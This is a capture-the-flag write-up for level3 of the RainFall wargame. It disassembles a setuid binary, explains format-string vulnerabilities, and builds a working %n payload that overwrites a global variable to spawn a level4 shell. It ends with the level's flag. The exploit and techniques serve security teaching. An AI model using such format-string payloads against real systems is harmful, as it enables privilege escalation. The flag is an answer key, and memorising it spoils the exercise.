# Level3

## 1. Initial Analysis
### 1.1 File Metadata & Permissions
```bash
level3@RainFall:~$ file ./level3 
./level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```
```bash
level3@RainFall:~$ ls -l ./level3 
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 ./level3
```
- **SetUID (s)**: The binary has the `s` bit on the owner's permissions, meaning it executes with the privileges of the file owner (`level4`) rather than the user running it (`level3`).
- **SetGID (s)**: Similarly, the group ID is set, allowing the process to inherit the `users` group permissions.
- **The Hint**: The goal is to exploit the binary to hijack its execution flow; because of these bits, any shell spawned will inherit `level4` privileges, allowing access to the next level's password.

## 2. Static Analysis with Objdump
```bash
level3@RainFall:~$ objdump -d ./level3 
```
```nasm
080484a4 <v>:
 80484a4:	55                   	push   %ebp
 80484a5:	89 e5                	mov    %esp,%ebp
 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
 80484bd:	00 
 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484c4:	89 04 24             	mov    %eax,(%esp)
 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
 80484d2:	89 04 24             	mov    %eax,(%esp)
 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
 80484df:	83 f8 40             	cmp    $0x40,%eax
 80484e2:	75 34                	jne    8048518 <v+0x74>
 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
 80484e9:	89 c2                	mov    %eax,%edx
 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
 80484f4:	c7 44 24 08 0c 00 00 	movl   $0xc,0x8(%esp)
 80484fb:	00 
 80484fc:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
 8048503:	00 
 8048504:	89 04 24             	mov    %eax,(%esp)
 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
 804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp)
 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
 8048518:	c9                   	leave  
 8048519:	c3                   	ret    

0804851a <main>:
 804851a:	55                   	push   %ebp
 804851b:	89 e5                	mov    %esp,%ebp
 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
 8048525:	c9                   	leave  
 8048526:	c3                   	ret    
 8048527:	90                   	nop
 8048528:	90                   	nop
 8048529:	90                   	nop
 804852a:	90                   	nop
 804852b:	90                   	nop
 804852c:	90                   	nop
 804852d:	90                   	nop
 804852e:	90                   	nop
 804852f:	90                   	nop
```

### 2.1 Vulnerability Analysis
At address 0x80484d5, the program calls printf(buffer). Because there is no format specifier (like %s), printf parses the content of our buffer for its own specifiers.

### 2.2 What is Format String Vulnerability ?
A Format String Vulnerability occurs when an application takes user-supplied input and passes it as the first argument to a printf() family function without a hardcoded format specifier.
The printf function is "blind." It assumes that for every format specifier (like %p or %n) found in the string, a corresponding argument has been pushed onto the stack. If the programmer didn't provide those arguments, printf will simply grab whatever data is currently sitting on the stack and use it.
Exploitation Techniques
1. Data Leaking (%p, %x): An attacker can read values from the stack (passwords, canary values, or memory addresses) by providing multiple %p specifiers.

2. Memory Reading (%s): By providing an address and using %s, an attacker can read data from anywhere in the program's memory.

3. Memory Writing (%n): The most critical exploit. The %n specifier writes the number of characters printed so far into a memory address.
This allows attackers to perform an Arbitrary Memory Write, enabling them to bypass security checks by modifying variables, escalate privileges by altering user IDs, or hijack the program’s execution flow by overwriting function pointers in the GOT or return addresses on the stack.

## 3. Exploitation Strategy
### 3.1 Target Identification
By analyzing the assembly at 0x080484da, we identify the logic used to gate the shell:
```nasm
80484da: a1 8c 98 04 08    mov 0x804988c, %eax  ; Load variable 'm'
80484df: 83 f8 40          cmp $0x40, %eax      ; Compare with 0x40 (64)
80484e2: 75 34             jne 8048518          ; Exit if not equal
```
- Target Memory Address: 0x0804988c
- Value to compare: 0x40(64)

### 3.2 Determining the Stack Offset
To use %n, we must know the position of our input string on the stack relative to printf. We send a unique "anchor" (AAAA) and observe where it appears in the memory dump:
```bash
level3@RainFall:~$ python -c "print 'AAAA' + ' %x'*10" | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078
```
The value 0x41414141 (Hex for AAAA) appears at the 4th position. This confirms our Stack Offset is 4.

## 4. Payload Contruction
To satisfy the condition if(m)==64 we need to craft a payload which fill 64 characters inject in a variable with %n
we begin by inject the target address 0804988c so \x8c\x98\x04\x08 in our payload
then we need to fill with 60 more characteres for satisfy the condition
We use %4$n to access the 4th offset on the stack (where we placed our address) and write the cumulative count of 64 bytes.

```bash
(python -c 'print "\x8c\x98\x04\x08" + "A"*60 + "%4$n"'; cat) | ./level3
```

## flag
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa